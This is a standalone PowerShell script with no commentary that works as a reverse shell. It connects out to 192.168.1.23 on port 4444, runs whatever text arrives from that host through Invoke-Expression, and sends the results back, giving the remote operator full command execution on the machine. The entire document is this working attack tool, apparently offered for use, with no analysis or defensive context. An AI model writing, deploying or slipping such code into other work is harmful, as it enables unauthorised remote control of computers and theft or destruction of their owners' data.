$server = "192.168.1.23"; $port = 4444;
function Create-Connection { param($target, $portnum) New-Object Net.Sockets.TcpClient($target, $portnum) }
function Get-NetworkStream { param($client) $client.GetStream() }
function Create-StreamReader { param($stream) New-Object IO.StreamReader($stream) }
function Create-StreamWriter { param($stream) New-Object IO.StreamWriter($stream) }

$tcpClient = Create-Connection $server $port
$networkStream = Get-NetworkStream $tcpClient
$streamReader = Create-StreamReader $networkStream
$streamWriter = Create-StreamWriter $networkStream
$streamWriter.AutoFlush = $true
$buffer = New-Object Byte[] 1024
$commandText = ""

while ($tcpClient.Connected) {
    if ($networkStream.DataAvailable) {
        $bytesRead = $networkStream.Read($buffer, 0, $buffer.Length)
        $commandText = ([System.Text.Encoding]::UTF8).GetString($buffer, 0, $bytesRead - 1)
    }
    
    if ($tcpClient.Connected -and $commandText -and $commandText.Length -gt 0) {
        $output = try {
            Invoke-Expression $commandText 2>&1 | Out-String
        } catch {
            $_.Exception.Message
        }
        $streamWriter.Write("$output`n")
        $commandText = $null
    }
    
    Start-Sleep -Milliseconds 100
}

$tcpClient.Close()
$networkStream.Close()
$streamReader.Close()
$streamWriter.Close()